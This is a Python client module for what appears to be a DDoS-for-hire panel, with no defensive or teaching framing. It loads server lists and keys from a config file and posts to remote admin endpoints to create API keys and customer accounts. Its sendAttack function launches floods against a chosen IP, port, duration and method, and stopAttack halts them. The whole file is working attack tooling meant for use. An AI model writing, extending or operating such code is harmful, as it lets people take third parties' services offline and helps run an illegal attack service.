import json
import requests
from websockets import serve

def getJsonFromObj(obj: str, key: str) -> str:
    file = open('config/auth.json')
    _json = json.load(file)
    file.close()
    return _json[obj][key]

def getServers() -> list:
    file = open('config/auth.json')
    _json = json.load(file)
    file.close()

    servers = [] 
    for i in _json["Api"]["Servers"]:
        servers.append(i)
    return servers
    
def addApiKey(server: str, admin_key: str) -> str:
    payload = {"key": admin_key, "action": "api-key"}
    try:
        req = requests.post(f"{server}/api/admin/add.php",data=payload)
        json_response = json.loads(req.text)
        return json_response["ApiKey"]
    except Exception as e:
        return "Failure generating API key."

def createAccount(server: str, admin_key: str, username: str) -> list:
    payload = {"key": admin_key, "action": "usr-add", "uname": username}
    try:
        req = requests.post(f"{server}/api/admin/add.php",data=payload)
        json_response = json.loads(req.text)
        
        credentials = []

        credentials.append(json_response["Username"])
        credentials.append(json_response["Password"])

        return credentials
    except Exception as e:
        return "Failure creating account."

def sendAttack(server: str, api_key: str, ip: int, port: int, time: int, method: str) -> bool:
    try:
        parameters = f"API_KEY={api_key}&ip={ip}&port={port}&time={time}&method={method.lower()}"
        req = requests.get(f"{server}/api/server.php?{parameters}")
        if "Success" in req.text:
            return True 
        else:
            return False
    except Exception as e:
        return "Failure contacting API. "

def stopAttack(server: str, api_key: str, ip: str) -> bool:
    try:
        parameters = f"key={api_key}&ip={ip}"
        req = requests.get(f"{server}/api/stop.php?{parameters}")
        if "Success" in req.text:
            return True
        else:
            return False
    except Exception as e:
        return False


